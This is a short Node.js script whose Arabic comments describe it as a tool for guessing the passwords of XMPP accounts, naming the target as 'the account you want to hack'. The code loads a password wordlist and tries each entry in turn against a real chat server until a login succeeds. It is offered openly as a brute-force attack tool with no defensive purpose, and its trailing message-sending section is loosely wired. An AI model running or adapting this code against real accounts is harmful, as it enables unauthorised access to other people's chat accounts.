//كود جافا سكريب لمحاولة تخمين كلمان مرور لحسابات xmpp
//By_MacKdoS_Alrb
//pwd.txt=ملف الباسوردات
//mackdos@syriatalk.org=الحساب الذي تود اختراقه

const simpleXmpp = require('simple-xmpp');
const fs = require('fs');
const path = require('path');

const jid = 'mackdos@syriatalk.org'; // Replace with your JID
const passwordFile = path.join(__dirname, 'pwd.txt'); // Replace with the path to your password file

let passwords = [];

if (fs.existsSync(passwordFile)) {
    passwords = fs.readFileSync(passwordFile, 'utf8').split('\n').map((line) => line.trim());
}

if (passwords.length === 0) {
    console.error(`No passwords found in ${passwordFile}`);
    process.exit(1);
}

let passwordIndex = 0;

simpleXmpp.connect({
    jid: jid,
    password: passwords[passwordIndex],
    host: 'syriatalk.org',
    port: 5222
});

simpleXmpp.on('online', () => {
    console.log(`Connected and authenticated as ${jid}`);
    simpleXmpp.disconnect();
});

simpleXmpp.on('error', (err) => {
    console.error(`Error: ${err}`);
    passwordIndex++;
    if (passwordIndex < passwords.length) {
        console.log(`Trying password: ${passwords[passwordIndex]}`);
        simpleXmpp.connect({
            jid: jid,
            password: passwords[passwordIndex],
            host: 'syriatalk.org',
            port: 5222
        });
    } else {
        console.log('All passwords failed');
        process.exit(1);
    }
});

const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter message: ', (message) => {
    simpleXmpp.on('disconnect', () => {
        console.log('Disconnected from server');
        process.exit(0);
    });

    simpleXmpp.on('connect', () => {
        console.log(`Trying password: ${passwords[passwordIndex]}`);
    });

    simpleXmpp.send('user@domain', message);

    rl.close();
});
